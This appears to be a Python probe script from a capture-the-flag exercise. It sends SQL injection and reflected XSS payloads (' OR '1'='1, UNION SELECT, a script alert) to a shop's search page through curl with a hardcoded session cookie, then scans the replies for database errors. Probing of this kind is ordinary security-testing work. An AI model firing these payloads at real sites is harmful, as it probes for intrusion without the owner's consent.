#!/usr/bin/env python3
"""
Sonda del buscador: inyección SQL / XSS reflejado.
Prueba payloads y guarda las respuestas para comparar.
"""
import re
import subprocess
import urllib.parse
from html import unescape

COOKIE = "trama_session=Vgb10FPCRELz_F_vMBbmZuRHczUjV3V1DKFygYKh22mTBZdgeA-3Qsy5Sgd3RSKU"
BASE = "https://<host>"
W = "/mnt/c/Users/<usuario>/OneDrive - dipreca.cl/Agentes IA/AUDITORIA_IA_V2/ctf/feriapersa/work"

payloads = [
    ("normal", "parlante"),
    ("comilla", "'"),
    ("or1", "' OR '1'='1"),
    ("or1b", "' OR 1=1-- -"),
    ("or1c", "x' OR '1'='1' -- -"),
    ("doble", '"'),
    ("union1", "' UNION SELECT 1-- -"),
    ("xss", "<script>alert(1)</script>"),
    ("vip", "vip"),
    ("descuento", "descuento"),
    ("puesto13", "puesto 13"),
    ("13", "13"),
]

for nombre, p in payloads:
    url = f"{BASE}/buscar?q={urllib.parse.quote(p)}"
    r = subprocess.run(["curl", "-s", "-m", "20", "-b", COOKIE, "-w", "\n__CODE__%{http_code}", url],
                       capture_output=True, text=True)
    cuerpo, _, code = r.stdout.rpartition("__CODE__")
    open(f"{W}/sqli_{nombre}.html", "w", encoding="utf-8").write(cuerpo)

    txt = unescape(re.sub(r"<[^>]+>", " ", re.sub(r"(?is)<(script|style).*?</\1>", " ", cuerpo)))
    txt = re.sub(r"\s+", " ", txt)
    m = re.search(r"No encontramos nada para(.{0,80})", txt)
    productos = cuerpo.count('class="producto-card')
    err = re.findall(r"(?i)(error|traceback|sql|syntax|exception|warning)[^<]{0,80}", cuerpo)
    print(f"{nombre:10s} [{code}] prod={productos:2d} len={len(cuerpo):5d} "
          f"msg={m.group(0)[:70] if m else '-'!r}")
    if err:
        print(f"           posibles errores: {err[:3]}")
